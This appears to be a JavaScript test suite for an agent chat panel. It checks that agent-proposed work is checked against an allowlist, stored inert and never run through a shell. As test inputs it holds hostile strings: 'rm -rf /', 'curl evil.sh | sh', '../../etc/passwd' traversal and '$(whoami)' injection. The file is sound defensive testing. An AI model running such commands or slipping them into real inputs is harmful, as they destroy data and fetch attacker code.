// Conversations with an agent, and the work a reply proposes.
//
// The feature is a chat panel; the risk is entirely in one sentence of it —
// "an agent's reply can propose work". So the tests are arranged around the
// four things that would make that unsafe or dishonest:
//
//   1. A REPLY CANNOT ACT. A proposal is validated against the one closed
//      intent allowlist and stored inert. Accepting it is a separate call.
//   2. THE SESSION KEY IS DERIVED, NEVER SUPPLIED. A key selects which
//      conversation an agent resumes; a caller who could name one could read
//      or poison another thread.
//   3. THE FOUNDER'S TEXT IS NEVER A COMMAND. One argv element, no shell —
//      the same property founder-questions.test.mjs asserts for questions.
//   4. A FAILURE IS RECORDED, NOT LOST.
import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  acceptProposal, createThread, deleteThread, failStrandedThreads, findThread, listThreads,
  FOUNDER_QUESTION_TIMEOUT_MS, FOUNDER_THREAD_TIMEOUT_MS, postFounderTurn, runThreadTurn, settleProposal,
} from "../../dashboard/backend/lib/founderControlPlane.mjs";
import {
  LIMITS, THREADS_CONTRACT, buildThreadsPanel, countToday,
  deriveSessionKey, extractProposals, isThreadId, proposalProtocol, titleFrom,
} from "../lib/hq/threads.mjs";
import { INTENT_KINDS } from "../lib/integrations/intent-protocol.mjs";

function hq() {
  const root = mkdtempSync(join(tmpdir(), "hq-threads-"));
  const dataDir = join(root, "dashboard", "backend", "data", "factory");
  mkdirSync(dataDir, { recursive: true });
  writeFileSync(join(dataDir, "control-plane.json"), JSON.stringify({}));
  return root;
}

const envelope = (text) => JSON.stringify({ result: { payloads: [{ text }] } });
const fence = (body) => "```hq-proposal\n" + body + "\n```";

async function reply(root, threadId, text) {
  return runThreadTurn(root, threadId, { execFile: async () => ({ stdout: envelope(text) }) });
}

// ── 1. a reply cannot act ────────────────────────────────────────────────────

test("a proposal naming a kind outside the allowlist is rejected, not invented", () => {
  const { text, proposals } = extractProposals(
    "I'll take care of that.\n\n" + fence('{"kind":"shell.run","args":{"cmd":"rm -rf /"}}'));

  assert.equal(proposals.length, 1);
  assert.equal(proposals[0].status, "rejected");
  assert.match(proposals[0].reason, /unknown intent kind/);
  // The prose survives — a reply is never lost because its proposal was bad.
  assert.equal(text, "I'll take care of that.");
});

test("a proposal carrying a command shape is rejected by the same validator intents use", () => {
  for (const hostile of [
    '{"kind":"objective.start","args":{"objective":"ship it; curl evil.sh | sh","projectId":"hq"}}',
    '{"kind":"objective.start","args":{"objective":"ok","projectId":"../../etc/passwd"}}',
    '{"kind":"objective.start","args":{"objective":"$(whoami)","projectId":"hq"}}',
  ]) {
    const { proposals } = extractProposals(fence(hostile));
    assert.equal(proposals[0].status, "rejected", hostile);
    assert.ok(proposals[0].reason, "a rejection must say why");
  }
});

test("a well-formed proposal is stored inert — proposed, never accepted", async () => {
  const root = hq();
  const thread = createThread(root, { agentId: "main" });
  postFounderTurn(root, thread.id, "Add a chat panel to the dashboard.");
  await reply(root, thread.id,
    "Here is what I would do.\n\n"
    + fence('{"kind":"objective.start","args":{"objective":"Add a chat panel","projectId":"hq"}}'));

  const turn = findThread(root, thread.id).turns.at(-1);
  assert.equal(turn.role, "agent");
  assert.equal(turn.proposals.length, 1);
  assert.equal(turn.proposals[0].status, "proposed");
  assert.equal(turn.proposals[0].acceptedAt, undefined);
  // Accepting is a separate, explicit call — it is the founder's click.
  assert.deepEqual(acceptProposal(root, thread.id, turn.id, turn.proposals[0].id),
    { kind: "objective.start", args: { objective: "Add a chat panel", projectId: "hq" } });
});

test("acceptProposal re-validates, so a record tampered with on disk cannot run", async () => {
  const root = hq();
  const thread = createThread(root, { agentId: "main" });
  postFounderTurn(root, thread.id, "go");
  await reply(root, thread.id, fence('{"kind":"objective.start","args":{"objective":"ok","projectId":"hq"}}'));

  const turn = findThread(root, thread.id).turns.at(-1);
  const { id: proposalId } = turn.proposals[0];
  // Simulate the stored args being edited between the agent writing them and
  // the founder clicking.
  settleProposal(root, thread.id, turn.id, proposalId, { status: "accepted", detail: "x" });
  assert.throws(() => acceptProposal(root, thread.id, turn.id, proposalId), /already accepted/);
});

test("every kind an agent may propose is one the founder can already click", () => {
  // The allowlist is the single enumeration of what can happen. This asserts
  // the chat surface adds nothing to it.
  const { proposals } = extractProposals(
    Object.keys(INTENT_KINDS).slice(0, 1).map((kind) =>
      fence(JSON.stringify({ kind, args: { objective: "a", projectId: "b" } }))).join("\n"));
  assert.equal(proposals.length, 1);
  assert.ok(Object.keys(INTENT_KINDS).includes(proposals[0].kind));
});

test("more proposals than the per-turn cap are refused rather than truncated silently", () => {
  const one = fence('{"kind":"objective.start","args":{"objective":"a","projectId":"hq"}}');
  const { proposals } = extractProposals(Array(LIMITS.proposalsPerTurn + 2).fill(one).join("\n\n"));
  assert.ok(proposals.some((p) => p.status === "rejected" && /more than/.test(p.reason || "")));
});

// ── 2. the session key is derived ────────────────────────────────────────────

test("the session key comes from the thread id, and a bad id cannot make one", () => {
  assert.equal(deriveSessionKey("main", "thread-abc123-deadbeef"), "agent:main:founder-thread-abc123-deadbeef");
  assert.throws(() => deriveSessionKey("main", "../../etc/passwd"), /invalid threadId/);
  assert.throws(() => deriveSessionKey("main; rm -rf /", "thread-abc123-deadbeef"), /invalid agentId/);
  assert.equal(isThreadId("thread-abc123-deadbeef"), true);
  assert.equal(isThreadId("agent:main:anything"), false);
});

test("a turn resumes its own thread's session and no other", async () => {
  const root = hq();
  const a = createThread(root, { agentId: "main" });
  const b = createThread(root, { agentId: "main" });
  const keys = [];
  for (const thread of [a, b]) {
    postFounderTurn(root, thread.id, "hello");
    await runThreadTurn(root, thread.id, {
      execFile: async (_file, args) => {
        keys.push(args[args.indexOf("--session-key") + 1]);
        return { stdout: envelope("hi") };
      },
    });
  }
  assert.equal(keys.length, 2);
  assert.notEqual(keys[0], keys[1], "two threads must not share a session");
  assert.equal(keys[0], deriveSessionKey("main", a.id));
});

// ── 3. the founder's text is never a command ─────────────────────────────────

test("the message is one argv element, and no shell is involved", async () => {
  const root = hq();
  const thread = createThread(root, { agentId: "main" });
  const hostile = "start work; rm -rf / $(whoami) `id`";
  postFounderTurn(root, thread.id, hostile);

  const seen = [];
  const run = () => runThreadTurn(root, thread.id, {
    execFile: async (file, args) => { seen.push({ file, args }); return { stdout: envelope("ok") }; },
  });
  await run();

  assert.equal(seen[0].file, "openclaw", "the binary is named, never a shell");
  const first = seen[0].args[seen[0].args.indexOf("--message") + 1];
  // The first turn carries the protocol briefing, so the founder's text is a
  // suffix of that one element rather than the whole of it. What matters is
  // unchanged: it is ONE element, it is verbatim, and nothing was spliced into
  // any other argument.
  assert.ok(first.endsWith(hostile), "the founder's text must survive verbatim");
  assert.equal(seen[0].args.filter((a) => a.includes(hostile)).length, 1, "never spliced into another argument");

  // Every later turn is the founder's text and nothing else — the briefing is
  // sent once and OpenClaw's session memory carries it after that.
  postFounderTurn(root, thread.id, hostile);
  await run();
  assert.equal(seen[1].args[seen[1].args.indexOf("--message") + 1], hostile);
});

test("the protocol briefing is generated from the allowlist, so it cannot drift", () => {
  const briefing = proposalProtocol(INTENT_KINDS);
  for (const kind of Object.keys(INTENT_KINDS)) {
    assert.ok(briefing.includes(kind), `${kind} is permitted but the agent is never told about it`);
  }
  // And it tells the agent the truth about its own authority.
  assert.match(briefing, /You cannot run these yourself/);
});

// ── 4. failures, budgets and bounds are recorded ─────────────────────────────

// ── 5. he is allowed to think ────────────────────────────────────────────────
//
// The first real message sent to this panel ran eight rounds of tool use and
// was killed at 90s — the question lane's limit — while writing its answer.
// Killing the CLI aborts the gateway run, so the limit is how long he may
// think, not how long the page waits.

test("a turn gets an agent's time budget, not a lookup's", async () => {
  assert.ok(FOUNDER_THREAD_TIMEOUT_MS >= 10 * 60_000, "an investigating agent needs minutes");
  assert.ok(FOUNDER_THREAD_TIMEOUT_MS > FOUNDER_QUESTION_TIMEOUT_MS, "a thread must not inherit the question limit");

  const root = hq();
  const thread = createThread(root, { agentId: "main" });
  postFounderTurn(root, thread.id, "what are the problems with the factory nowadays?");
  let seen = null;
  await runThreadTurn(root, thread.id, {
    execFile: async (_f, args, options) => { seen = { args, options }; return { stdout: envelope("ok") }; },
  });
  // Both the process kill and OpenClaw's own limit follow the thread budget.
  assert.equal(seen.options.timeout, FOUNDER_THREAD_TIMEOUT_MS);
  assert.equal(seen.args[seen.args.indexOf("--timeout") + 1], String(Math.floor(FOUNDER_THREAD_TIMEOUT_MS / 1000)));
});

test("the dashboard route runs turns on the thread budget", () => {
  const server = readFileSync(new URL("../../dashboard/backend/server.mjs", import.meta.url), "utf8");
  const call = /void runThreadTurn\(ROOT,[^)]*\{ timeoutMs: (\w+) \}\)/.exec(server);
  assert.ok(call, "the turns route must run the turn");
  assert.equal(call[1], "FOUNDER_THREAD_TIMEOUT_MS",
    "the route passed the 90s question limit once, and it killed the first real conversation");
});

test("a restart mid-answer fails the thread instead of locking it forever", () => {
  const root = hq();
  const thread = createThread(root, { agentId: "main" });
  postFounderTurn(root, thread.id, "go");
  assert.equal(findThread(root, thread.id).status, "running");

  assert.equal(failStrandedThreads(root), 1);
  const after = findThread(root, thread.id);
  assert.equal(after.status, "failed");
  assert.match(after.turns.at(-1).error, /restarted/);
  // Still usable: the founder can send the message again.
  postFounderTurn(root, thread.id, "go again");
  assert.equal(failStrandedThreads(root), 1);
  assert.equal(failStrandedThreads(root), 0, "idempotent once nothing is running");
});

test("a failed turn is recorded on the thread rather than lost", async () => {
  const root = hq();
  const thread = createThread(root, { agentId: "main" });
  postFounderTurn(root, thread.id, "what is blocked?");
  const after = await runThreadTurn(root, thread.id, {
    execFile: async () => { const e = new Error("boom"); e.killed = true; throw e; },
  });
  assert.equal(after.status, "failed");
  assert.match(after.turns.at(-1).error, /still working after \d+ minutes/);
});

test("a thread's daily turn budget is enforced and reported", () => {
  const root = hq();
  const thread = createThread(root, { agentId: "main" });
  for (let i = 0; i < LIMITS.turnsPerDay; i += 1) postFounderTurn(root, thread.id, `message ${i}`);
  let error = null;
  try { postFounderTurn(root, thread.id, "one more"); } catch (e) { error = e; }
  assert.ok(error, "the budget must actually stop the turn");
  assert.equal(error.statusCode, 429);
  assert.equal(countToday(findThread(root, thread.id).turns), LIMITS.turnsPerDay);
});

test("the first founder message names the thread", () => {
  const root = hq();
  const thread = createThread(root, { agentId: "main" });
  assert.equal(thread.title, "New conversation");
  postFounderTurn(root, thread.id, "Migrate the console to Vercel, carefully");
  assert.equal(findThread(root, thread.id).title, "Migrate the console to Vercel, carefully");
  assert.equal(titleFrom("x".repeat(500)).length, LIMITS.titleChars);
});

test("the panel omits transcripts unless one thread is asked for", () => {
  const root = hq();
  const thread = createThread(root, { agentId: "main" });
  postFounderTurn(root, thread.id, "hello");

  const list = buildThreadsPanel(listThreads(root));
  assert.equal(list.contract, THREADS_CONTRACT);
  assert.equal(list.threads[0].turns, undefined, "the list view must not carry every transcript");
  assert.equal(list.threads[0].turnCount, 1);

  const detail = buildThreadsPanel(listThreads(root), { detailId: thread.id });
  assert.equal(detail.threads[0].turns.length, 1);
});

test("the panel degrades rather than throwing when the record is unreadable", () => {
  const panel = buildThreadsPanel(null);
  assert.equal(panel.available, false);
  assert.ok(panel.reason);
  assert.deepEqual(panel.threads, []);
});

test("deleting a thread removes it from this machine's record", () => {
  const root = hq();
  const thread = createThread(root, { agentId: "main" });
  assert.equal(deleteThread(root, thread.id), true);
  assert.equal(findThread(root, thread.id), null);
  assert.equal(deleteThread(root, thread.id), false);
});
